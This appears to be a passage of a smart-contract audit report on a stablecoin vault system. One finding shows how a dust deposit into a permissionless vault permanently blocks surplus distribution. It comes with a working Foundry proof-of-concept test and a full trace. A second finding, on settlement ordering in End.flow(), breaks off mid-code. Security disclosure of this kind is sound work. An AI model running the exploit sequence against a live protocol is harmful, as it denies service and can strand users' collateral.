# Permissionless Vault Creation on PSM-Designated `noFee` Ilks Bricks `BalanceSheet.distributeSurplus`

**Target:** `VaultEngine.sol`, `CollateralAdapter.sol`, `BalanceSheet.sol`

---

## Summary

`BalanceSheet.distributeSurplus()` treats every `noFee` (fee-exempt) ilk as if all of its debt (`globalArt * rate`) is backed 1:1 by `ReserveAccounting.totalReserve()`. That assumption only holds if the *only* way to create debt against a `noFee` ilk is through `PegStabilityModule.sellStable`, which is the one path that calls `ReserveAccounting.recordIncrease`.

Nothing enforces that. `VaultEngine.open`, `CollateralAdapter.join`, and `VaultEngine.frob` are all fully permissionless for **any** initialized ilk including the exact `noFee` ilks the PSM uses (`USDT-A`, `USDC-A`). An attacker can open their own vault against a PSM ilk, deposit a dust amount of the real stablecoin through `CollateralAdapter.join` (which credits collateral via `VaultEngine.slip` and never calls `ReserveAccounting.recordIncrease`) and then draw USDR against it 1:1 via `frob` (safe because `noFee` ⇒ `rate == RAY`, and `spot` is already `RAY` since the PSM depends on it).

This inflates `ilks[ilkId].globalArt` without ever touching `reserveAccounting.totalReserve()`. Every subsequent call to `distributeSurplus()` sums `globalArt * rate` across all `noFee` ilks and compares it to `totalReserve() * RAY`; once the attacker's debt exists, that check permanently fails with `ReserveBackingShortfall`, for the cost of a single dust-sized deposit.

### Vulnerable code

`VaultEngine.sol` :: `open` has no caller/ilk restriction beyond initialization:

```solidity
function open(bytes32 ilkId, address usr) external returns (uint256 vaultId) {
    if (live != 1) { _revert(NotLive.selector); }
    if (usr == address(0)) { _revert(InvalidAddress.selector); }
    if (ilks[ilkId].rate == 0) { _revert(IlkNotInitialized.selector); }

    vaultId = ++vaultCount;
    ownerOf[vaultId] = usr;
    ilkOf[vaultId] = ilkId;

    emit Open({ ilkId: ilkId, owner: usr, vaultId: vaultId });
}
```

`CollateralAdapter.sol` :: `join`'s non-USDR branch only calls `VaultEngine.slip`, never `ReserveAccounting`:

```solidity
} else {
    if (ilk.live != 1) { _revert(NotLive.selector); }

    uint256 balanceBefore = ilk.token.balanceOf(address(this));
    ilk.token.safeTransferFrom(msg.sender, address(this), amount);
    uint256 received = ilk.token.balanceOf(address(this)) - balanceBefore;
    if (received != amount) { _revert(FeeOnTransferToken.selector); }

    uint256 wad = received * (10 ** (18 - ilk.dec));
    if (wad > uint256(type(int256).max)) { _revert(InvalidAmount.selector); }

    VAULT_ENGINE.slip(ilkId, user, int256(wad));   // <-- no ReserveAccounting call
}
```

`BalanceSheet.sol` :: `distributeSurplus`'s reserve-backing assertion, which the attacker trips:

```solidity
if (address(reserveAccounting) != address(0)) {
    uint256 stableDebt;
    uint256 length = VAULT_ENGINE.ilkIdsLength();

    for (uint256 i; i < length; ++i) {
        bytes32 ilkId = VAULT_ENGINE.ilkIds(i);
        if (VAULT_ENGINE.noFee(ilkId)) {
            (uint256 globalArt, , uint256 rate, , , , , ) = VAULT_ENGINE.ilks(ilkId);
            stableDebt += globalArt * rate;
        }
    }

    if (reserveAccounting.totalReserve() * _RAY < stableDebt) {
        _revert(ReserveBackingShortfall.selector);   // <-- trips here
    }
}
```

By contrast, `ReserveAccounting.recordIncrease`/`recordDecrease` are gated behind `_RECORDER_ROLE`  a role intended only for the PSM  showing the protocol *does* recognize this state needs to be access-controlled. That control simply never reaches `VaultEngine`/`CollateralAdapter`.

### Exploit path

1. Governance initializes a stablecoin ilk (e.g. `USDT-A`), marks it `noFee`, and `PegStabilityModule.init` opens its dedicated PSM vault against it. In steady state, `ReserveAccounting.totalReserve() * RAY == globalArt * rate` for the ilk.
2. Attacker calls `VaultEngine.open(USDT_ILK, attacker)`  permissionless, succeeds.
3. Attacker calls `CollateralAdapter.join(USDT_ILK, attacker, 1)` (1 unit of USDT, 6 decimals)  permissionless, credits `1e12` wad of collateral via `slip`, **never touches `ReserveAccounting`**.
4. Attacker calls `VaultEngine.frob(vaultId, attacker, attacker, dink=1e12, dart=1e12)` — passes the safety check because `spot == RAY` and `rate == RAY` on a `noFee` ilk. Attacker now holds `1e12` wad (0.000001) more USDR-denominated debt than the reserve was ever credited for.
5. Any subsequent `BalanceSheet.distributeSurplus()` call reverts with `ReserveBackingShortfall()`  permanently, until someone with `_WARD_ROLE` intervenes (see Mitigation/Impact).


## Impact

| # | Effect | Trigger cost | Reversible? | Who is harmed |
|---|--------|--------------|-------------|----------------|
| 1 | `BalanceSheet.distributeSurplus()`  the protocol's **only** surplus buyback-and-burn mechanism  reverts unconditionally with `ReserveBackingShortfall()` on every call, indefinitely | ~1 unit (0.000001) of any PSM-registered stablecoin + gas | Only via privileged `_WARD_ROLE` action (see below) | Protocol treasury / RAIN buyback mechanism (denial of service) |
| 2 | Every `noFee` ilk registered with the PSM is affected simultaneously, since `distributeSurplus` sums debt across *all* `noFee` ilks in one loop | Same single attack | — | All PSM stable ilks (`USDT-A`, `USDC-A`, and any future ones) |
| 3 | Attack is repeatable/compoundable at dust cost per additional ilk or to increase the shortfall, with no economic disincentive (attacker's own collateral remains fully claimable by them) | Dust per repetition | — | Protocol |
| 4 | Recovery requires a privileged actor to call `VaultEngine.grab()` on the attacker's vault to forcibly seize the position (governance-only, `_WARD_ROLE`)  this is live-callable (no `live == 1` check) but pushes the seized debt into `sin`/bad debt, which must then be separately funded and `heal`ed | Governance gas + bad-debt backstop capacity | Yes, but not free | Governance / protocol solvency buffer |

This was independently confirmed on a live PoC run, not just argued theoretically: `distributeSurplus()` demonstrably reverts on real call after the attack sequence above (see trace, `ReserveBackingShortfall()` at the final call), while an identical call before the attack succeeds and returns the expected `excess`.


---

## Mitigation

**Restrict vault creation for PSM-designated `noFee` ilks** to the corresponding `PegStabilityModule`. When a stable ilk is registered with the PSM, record the PSM as the authorized vault creator/owner for that ilk, and make `VaultEngine.open()` reject attempts to create additional vaults for that ilk unless the caller is the authorized PSM (and the vault owner is the PSM). This preserves the intended one-dedicated-vault model and prevents arbitrary users from increasing `globalArt` without the corresponding `ReserveAccounting` update.


## POC

Add this test in `tests/Reserve.t.sol::ReserveTest`

```solidity
    function test_permissionlessVaultOnNoFeePSMIlkBricksDistributeSurplus() public {
        balanceSheet.file("reserveAccounting", address(reserveAccounting));
        balanceSheet.file("buybackReceiver", address(0xB0B));

        uint256 reserveAmount = 100e6;
        uint256 attackerAmount = 1;
        address attacker = address(0xA11CE);

        // Establish the normal PSM/reserve state.
        _sellUsdt(user, reserveAmount);

        assertEq(reserveAccounting.totalReserve(), 100e18, "PSM reserve should be recorded");

        assertTrue(vaultEngine.noFee(USDT_ILK), "USDT-A must be fee exempt");

        (uint256 globalArtBefore,, uint256 rateBefore,,,,,) = vaultEngine.ilks(USDT_ILK);

        assertEq(globalArtBefore, 100e18);
        assertEq(rateBefore, _RAY);

        // Prove distribution works while the reserve fully backs all noFee debt.
        vaultEngine.suck(address(this), address(balanceSheet), 1 * _RAD);

        assertEq(balanceSheet.distributeSurplus(), 1 * _RAD, "healthy state should distribute");

        // -------------------------------------------------------------
        // ATTACKER
        // -------------------------------------------------------------

        // Cost is only 1 unit of a 6-decimal stablecoin = 0.000001 USDT.
        usdt.mint(attacker, attackerAmount);

        vm.startPrank(attacker);

        usdt.approve(address(collateralAdapter), attackerAmount);

        // Permissionless: attacker can open a vault against the PSM ilk.
        uint256 vaultId = vaultEngine.open(USDT_ILK, attacker);

        // Permissionless collateral deposit path.
        collateralAdapter.join(USDT_ILK, attacker, attackerAmount);

        // 1 USDT unit => 1e12 internal wad (USDT has 6 decimals).
        uint256 wad = attackerAmount * 1e12;

        // Because USDT-A is noFee, rate == RAY and spot == RAY,
        // the attacker can draw against the deposited collateral.
        vaultEngine.frob(vaultId, attacker, attacker, int256(wad), int256(wad));

        vm.stopPrank();

        // -------------------------------------------------------------
        // Verify accounting divergence
        // -------------------------------------------------------------

        (uint256 globalArtAfter,, uint256 rateAfter,,,,,) = vaultEngine.ilks(USDT_ILK);

        assertEq(globalArtAfter, globalArtBefore + wad, "attacker debt must increase globalArt");

        assertEq(rateAfter, _RAY, "noFee ilk rate must remain RAY");

        // Critical property:
        // the attacker used the normal CollateralAdapter/VaultEngine path,
        // but no ReserveAccounting.recordIncrease() occurred.
        assertEq(reserveAccounting.totalReserve(), 100e18, "attacker action must not increase reserve accounting");

        // There is now unbacked noFee debt.
        assertGt(
            globalArtAfter * rateAfter,
            reserveAccounting.totalReserve() * _RAY,
            "noFee debt must exceed recorded reserve"
        );

        // Create fresh surplus so distributeSurplus() is actually exercised.
        vaultEngine.suck(address(this), address(balanceSheet), 1 * _RAD);

        vm.expectRevert(IBalanceSheet.ReserveBackingShortfall.selector);

        balanceSheet.distributeSurplus();
    }
```

## Trace

```text
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for tests/Reserve.t.sol:ReserveAuditTest
[PASS] test_permissionlessVaultOnNoFeePSMIlkBricksDistributeSurplus() (gas: 874778)
Traces:
  [1076578] ReserveAuditTest::test_permissionlessVaultOnNoFeePSMIlkBricksDistributeSurplus()
    ├─ [26502] BalanceSheet::file(0x726573657276654163636f756e74696e67000000000000000000000000000000, ReserveAccounting: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF])
    │   ├─ emit File(what: 0x726573657276654163636f756e74696e67000000000000000000000000000000, addr: ReserveAccounting: [0xD6BbDE9174b1CdAa358d2Cf4D57D1a9F7178FBfF])
    │   └─ ← [Return]
    ├─ [24468] BalanceSheet::file(0x6275796261636b52656365697665720000000000000000000000000000000000, 0x0000000000000000000000000000000000000B0b)
    │   ├─ emit File(what: 0x6275796261636b52656365697665720000000000000000000000000000000000, addr: 0x0000000000000000000000000000000000000B0b)
    │   └─ ← [Return]
    ├─ [46438] MockERC20::mint(0x000000000000000000000000000000000000bEEF, 100000000 [1e8])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000bEEF, amount: 100000000 [1e8])
    │   └─ ← [Stop]
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [24298] MockERC20::approve(PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 100000000 [1e8])
    │   ├─ emit Approval(owner: 0x000000000000000000000000000000000000bEEF, spender: PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], amount: 100000000 [1e8])
    │   └─ ← [Return] true
    ├─ [432107] PegStabilityModule::sellStable(0x555344542d410000000000000000000000000000000000000000000000000000, 0x000000000000000000000000000000000000bEEF, 100000000 [1e8])
    │   ├─ [2484] Governor::paused() [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [18018] VaultEngine::ilks(0x555344542d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0, true, 1000000000000000000000000000 [1e27]
    │   ├─ [25331] MockERC20::transferFrom(0x000000000000000000000000000000000000bEEF, PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 100000000 [1e8])
    │   │   ├─ emit Transfer(from: 0x000000000000000000000000000000000000bEEF, to: PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], amount: 100000000 [1e8])
    │   │   └─ ← [Return] true
    │   ├─ [24298] MockERC20::approve(CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 100000000 [1e8])
    │   │   ├─ emit Approval(owner: PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], spender: CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], amount: 100000000 [1e8])
    │   │   └─ ← [Return] true
    │   ├─ [62190] CollateralAdapter::join(0x555344542d410000000000000000000000000000000000000000000000000000, PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 100000000 [1e8])
    │   │   ├─ [2510] MockERC20::balanceOf(CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [23331] MockERC20::transferFrom(PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 100000000 [1e8])
    │   │   │   ├─ emit Transfer(from: PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], to: CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], amount: 100000000 [1e8])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [510] MockERC20::balanceOf(CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]) [staticcall]
    │   │   │   └─ ← [Return] 100000000 [1e8]
    │   │   ├─ [27249] VaultEngine::slip(0x555344542d410000000000000000000000000000000000000000000000000000, PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 100000000000000000000 [1e20])
    │   │   │   ├─ emit Slip(ilkId: 0x555344542d410000000000000000000000000000000000000000000000000000, user: PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], wad: 100000000000000000000 [1e20])
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit Join(ilkId: 0x555344542d410000000000000000000000000000000000000000000000000000, user: PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], amount: 100000000 [1e8])
    │   │   └─ ← [Return]
    │   ├─ [157034] VaultEngine::frob(1, PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 100000000000000000000 [1e20], 100000000000000000000 [1e20])
    │   │   ├─ [484] Governor::paused() [staticcall]
    │   │   │   └─ ← [Return] false
    │   │   ├─ [2731] SolvencyEngine::isVolatile(0x555344542d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   └─ ← [Return] false
    │   │   ├─ emit Frob(ilkId: 0x555344542d410000000000000000000000000000000000000000000000000000, vaultId: 1, v: PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], w: PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], dink: 100000000000000000000 [1e20], dart: 100000000000000000000 [1e20])
    │   │   └─ ← [Stop]
    │   ├─ [86606] CollateralAdapter::exit(0x5553445200000000000000000000000000000000000000000000000000000000, 0x000000000000000000000000000000000000bEEF, 100000000000000000000 [1e20])
    │   │   ├─ [27669] VaultEngine::move(PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 100000000000000000000000000000000000000000000000 [1e47])
    │   │   │   ├─ emit Move(from: PegStabilityModule: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], to: CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], rad: 100000000000000000000000000000000000000000000000 [1e47])
    │   │   │   └─ ← [Stop]
    │   │   ├─ [48768] USDR::mint(0x000000000000000000000000000000000000bEEF, 100000000000000000000 [1e20])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x000000000000000000000000000000000000bEEF, amount: 100000000000000000000 [1e20])
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit Exit(ilkId: 0x5553445200000000000000000000000000000000000000000000000000000000, user: 0x000000000000000000000000000000000000bEEF, amount: 100000000000000000000 [1e20])
    │   │   └─ ← [Return]
    │   ├─ [25975] ReserveAccounting::recordIncrease(100000000000000000000 [1e20])
    │   │   ├─ emit RecordIncrease(wad: 100000000000000000000 [1e20], totalReserve: 100000000000000000000 [1e20])
    │   │   └─ ← [Stop]
    │   ├─ emit SellStable(ilkId: 0x555344542d410000000000000000000000000000000000000000000000000000, user: 0x000000000000000000000000000000000000bEEF, stableAmt: 100000000 [1e8], usdrAmt: 100000000000000000000 [1e20])
    │   └─ ← [Return]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [341] ReserveAccounting::totalReserve() [staticcall]
    │   └─ ← [Return] 100000000000000000000 [1e20]
    ├─ [3166] VaultEngine::noFee(0x555344542d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Return] true
    ├─ [2018] VaultEngine::ilks(0x555344542d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000056BC75e2d63100000, 100000000000000000000 [1e20], true, 1000000000000000000000000000 [1e27]
    ├─ [72067] VaultEngine::suck(ReserveAuditTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BalanceSheet: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 1000000000000000000000000000000000000000000000 [1e45])
    │   ├─ emit Suck(u: ReserveAuditTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], v: BalanceSheet: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], rad: 1000000000000000000000000000000000000000000000 [1e45])
    │   └─ ← [Stop]
    ├─ [143550] BalanceSheet::distributeSurplus()
    │   ├─ [885] VaultEngine::usdr(BalanceSheet: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000000000000000000000000 [1e45]
    │   ├─ [3259] VaultEngine::sin(BalanceSheet: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [341] ReserveAccounting::totalReserve() [staticcall]
    │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   ├─ [3045] VaultEngine::ilkIdsLength() [staticcall]
    │   │   └─ ← [Return] 3
    │   ├─ [2719] VaultEngine::ilkIds(0) [staticcall]
    │   │   └─ ← [Return] 0x5241494e2d410000000000000000000000000000000000000000000000000000
    │   ├─ [3166] VaultEngine::noFee(0x5241494e2d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [2719] VaultEngine::ilkIds(1) [staticcall]
    │   │   └─ ← [Return] 0x555344542d410000000000000000000000000000000000000000000000000000
    │   ├─ [1166] VaultEngine::noFee(0x555344542d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [2018] VaultEngine::ilks(0x555344542d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000056BC75e2d63100000, 100000000000000000000 [1e20], true, 1000000000000000000000000000 [1e27]
    │   ├─ [2719] VaultEngine::ilkIds(2) [staticcall]
    │   │   └─ ← [Return] 0x555344432d410000000000000000000000000000000000000000000000000000
    │   ├─ [3166] VaultEngine::noFee(0x555344432d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [18018] VaultEngine::ilks(0x555344432d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0, true, 1000000000000000000000000000 [1e27]
    │   ├─ [341] ReserveAccounting::totalReserve() [staticcall]
    │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   ├─ [52002] SolvencyEngine::checkInvariant()
    │   │   ├─ [18018] VaultEngine::ilks(0x5241494e2d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0, true, 0
    │   │   ├─ [4889] OracleSecurityModule::peek(0x5241494e2d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000, false
    │   │   ├─ [341] ReserveAccounting::totalReserve() [staticcall]
    │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   │   ├─ [6228] ReserveAccounting::updateCommittedEscrow(0)
    │   │   │   ├─ emit UpdateCommittedEscrow(wad: 0, freeSlack: 100000000000000000000 [1e20])
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit InvariantChecked(reserve: 100000000000000000000 [1e20], worstCaseLoss: 0, passed: true)
    │   │   └─ ← [Return] 0, 100000000000000000000 [1e20]
    │   ├─ [314] SolvencyEngine::isBreached() [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [25430] VaultEngine::move(BalanceSheet: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 0x0000000000000000000000000000000000000B0b, 1000000000000000000000000000000000000000000000 [1e45])
    │   │   ├─ emit Move(from: BalanceSheet: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], to: 0x0000000000000000000000000000000000000B0b, rad: 1000000000000000000000000000000000000000000000 [1e45])
    │   │   └─ ← [Stop]
    │   ├─ emit DistributeSurplus(excess: 1000000000000000000000000000000000000000000000 [1e45])
    │   └─ ← [Return] 1000000000000000000000000000000000000000000000 [1e45]
    ├─ [24538] MockERC20::mint(0x00000000000000000000000000000000000A11cE, 1)
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x00000000000000000000000000000000000A11cE, amount: 1)
    │   └─ ← [Stop]
    ├─ [0] VM::startPrank(0x00000000000000000000000000000000000A11cE)
    │   └─ ← [Return]
    ├─ [24298] MockERC20::approve(CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 1)
    │   ├─ emit Approval(owner: 0x00000000000000000000000000000000000A11cE, spender: CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], amount: 1)
    │   └─ ← [Return] true
    ├─ [52231] VaultEngine::open(0x555344542d410000000000000000000000000000000000000000000000000000, 0x00000000000000000000000000000000000A11cE)
    │   ├─ emit Open(ilkId: 0x555344542d410000000000000000000000000000000000000000000000000000, owner: 0x00000000000000000000000000000000000A11cE, vaultId: 3)
    │   └─ ← [Return] 3
    ├─ [34290] CollateralAdapter::join(0x555344542d410000000000000000000000000000000000000000000000000000, 0x00000000000000000000000000000000000A11cE, 1)
    │   ├─ [510] MockERC20::balanceOf(CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]) [staticcall]
    │   │   └─ ← [Return] 100000000 [1e8]
    │   ├─ [3431] MockERC20::transferFrom(0x00000000000000000000000000000000000A11cE, CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], 1)
    │   │   ├─ emit Transfer(from: 0x00000000000000000000000000000000000A11cE, to: CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211], amount: 1)
    │   │   └─ ← [Return] true
    │   ├─ [510] MockERC20::balanceOf(CollateralAdapter: [0x1d1499e622D69689cdf9004d05Ec547d650Ff211]) [staticcall]
    │   │   └─ ← [Return] 100000001 [1e8]
    │   ├─ [25249] VaultEngine::slip(0x555344542d410000000000000000000000000000000000000000000000000000, 0x00000000000000000000000000000000000A11cE, 1000000000000 [1e12])
    │   │   ├─ emit Slip(ilkId: 0x555344542d410000000000000000000000000000000000000000000000000000, user: 0x00000000000000000000000000000000000A11cE, wad: 1000000000000 [1e12])
    │   │   └─ ← [Stop]
    │   ├─ emit Join(ilkId: 0x555344542d410000000000000000000000000000000000000000000000000000, user: 0x00000000000000000000000000000000000A11cE, amount: 1)
    │   └─ ← [Return]
    ├─ [78834] VaultEngine::frob(3, 0x00000000000000000000000000000000000A11cE, 0x00000000000000000000000000000000000A11cE, 1000000000000 [1e12], 1000000000000 [1e12])
    │   ├─ [484] Governor::paused() [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [731] SolvencyEngine::isVolatile(0x555344542d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ emit Frob(ilkId: 0x555344542d410000000000000000000000000000000000000000000000000000, vaultId: 3, v: 0x00000000000000000000000000000000000A11cE, w: 0x00000000000000000000000000000000000A11cE, dink: 1000000000000 [1e12], dart: 1000000000000 [1e12])
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [2018] VaultEngine::ilks(0x555344542d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000056Bc75f1637b51000, 100000001000000000000 [1e20], true, 1000000000000000000000000000 [1e27]
    ├─ [341] ReserveAccounting::totalReserve() [staticcall]
    │   └─ ← [Return] 100000000000000000000 [1e20]
    ├─ [341] ReserveAccounting::totalReserve() [staticcall]
    │   └─ ← [Return] 100000000000000000000 [1e20]
    ├─ [24267] VaultEngine::suck(ReserveAuditTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BalanceSheet: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 1000000000000000000000000000000000000000000000 [1e45])
    │   ├─ emit Suck(u: ReserveAuditTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], v: BalanceSheet: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], rad: 1000000000000000000000000000000000000000000000 [1e45])
    │   └─ ← [Stop]
    ├─ [0] VM::expectRevert(ReserveBackingShortfall())
    │   └─ ← [Return]
    ├─ [20830] BalanceSheet::distributeSurplus()
    │   ├─ [885] VaultEngine::usdr(BalanceSheet: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000000000000000000000000000 [1e45]
    │   ├─ [1259] VaultEngine::sin(BalanceSheet: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [341] ReserveAccounting::totalReserve() [staticcall]
    │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   ├─ [1045] VaultEngine::ilkIdsLength() [staticcall]
    │   │   └─ ← [Return] 3
    │   ├─ [719] VaultEngine::ilkIds(0) [staticcall]
    │   │   └─ ← [Return] 0x5241494e2d410000000000000000000000000000000000000000000000000000
    │   ├─ [1166] VaultEngine::noFee(0x5241494e2d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] false
    │   ├─ [719] VaultEngine::ilkIds(1) [staticcall]
    │   │   └─ ← [Return] 0x555344542d410000000000000000000000000000000000000000000000000000
    │   ├─ [1166] VaultEngine::noFee(0x555344542d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [2018] VaultEngine::ilks(0x555344542d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000056Bc75f1637b51000, 100000001000000000000 [1e20], true, 1000000000000000000000000000 [1e27]
    │   ├─ [719] VaultEngine::ilkIds(2) [staticcall]
    │   │   └─ ← [Return] 0x555344432d410000000000000000000000000000000000000000000000000000
    │   ├─ [1166] VaultEngine::noFee(0x555344432d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] true
    │   ├─ [2018] VaultEngine::ilks(0x555344432d410000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0, true, 1000000000000000000000000000 [1e27]
    │   ├─ [341] ReserveAccounting::totalReserve() [staticcall]
    │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   └─ ← [Revert] ReserveBackingShortfall()
    └─ ← [Return]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.16ms (792.34µs CPU time)

Ran 1 test suite in 13.73ms (5.16ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

```


# `End.flow()` Can Permanently Fix an Incorrect Redemption Price Before In-Flight Auctions Are Reconciled, Stranding Real Collateral

**Target:** `End.sol`

---

## Summary

`End.sol` documents settlement as an ordered sequence: `cage()` → `cage(ilkId)` → `skip()`/`skim()` → `thaw()` → `flow()` → `pack()` → `cash()`. But, the contract does not enforce the dependency between auction reconciliation and `flow()`. Specifically, `flow(ilkId)` only checks that `debt != 0` and `fix[ilkId] == 0`; it does not require all in-flight auctions for the ilk to have been reclaimed via `skip()` first.


### Distinction from the existing H-4 fix

H-4 fixed `skip()` so that, when called **before `flow()`**, the auctioned debt is correctly restored to `art[ilkId]`.

**This finding is about ordering:** `flow()` has no check that `skip()`/`skim()` have completed. If `flow()` executes first, it permanently freezes `fix[ilkId]` from an incomplete snapshot; the later H-4 correction cannot update it. The subsequently recovered collateral can therefore become permanently unclaimable through `cash()`.

### Exploit / trigger path

This requires no malicious intent it's a normal permissionless-caller / keeper-race outcome during shutdown of a system that had any liquidation in progress:

1. A vault is partially liquidated (`bark`) before shutdown; some of its debt/collateral is now inside a running Dutch auction, already removed from the ilk's `globalArt`.
2. Governance calls `End.cage()`, then `End.cage(ilkId)` snapshotting `art[ilkId]` at a value that excludes the still-auctioned debt.
3. After the cooldown, anyone calls `End.thaw()` it has no check that all auctions for every ilk have been reconciled.
4. Anyone (permissionless) calls `End.flow(ilkId)` before the auction is reclaimed. `fix[ilkId]` is now permanently set from the incomplete snapshot.
5. Later, someone calls `End.skip(ilkId, auctionId)` to reclaim the auction this correctly restores the debt into `art[ilkId]` and moves the auction's remaining collateral into the vault, then ultimately into `End` via `skim()`. But `fix[ilkId]` cannot be recomputed (`FixAlreadyDefined`).


### Vulnerable code

`End.sol`:`cage(ilkId)` snapshots debt that already excludes in-flight auction debt (removed at `bark` time):

```solidity
function cage(bytes32 ilkId) external {
    if (live != 0) { _revert(StillLive.selector); }
    if (tag[ilkId] != 0) { _revert(TagAlreadyDefined.selector); }

    (uint256 globalArt, , , , , , , ) = VAULT_ENGINE.ilks(ilkId);
    art[ilkId] = globalArt;   // <-- excludes debt already pulled into a running auction
    ...
}
```

`flow(ilkId)` has no dependency on `skip()`/`skim()` having run for the ilk, and can never be recomputed once set:

```solidity
function flow(bytes32 ilkId) external {
    if (debt == 0) { _revert(DebtNotFixed.selector); }
    if (fix[ilkId] != 0) { _revert(FixAlreadyDefined.selector); }   // <-- only guard; no auction-reconciliation check

    (, , uint256 rate, , , , , ) = VAULT_ENGINE.ilks(ilkId);

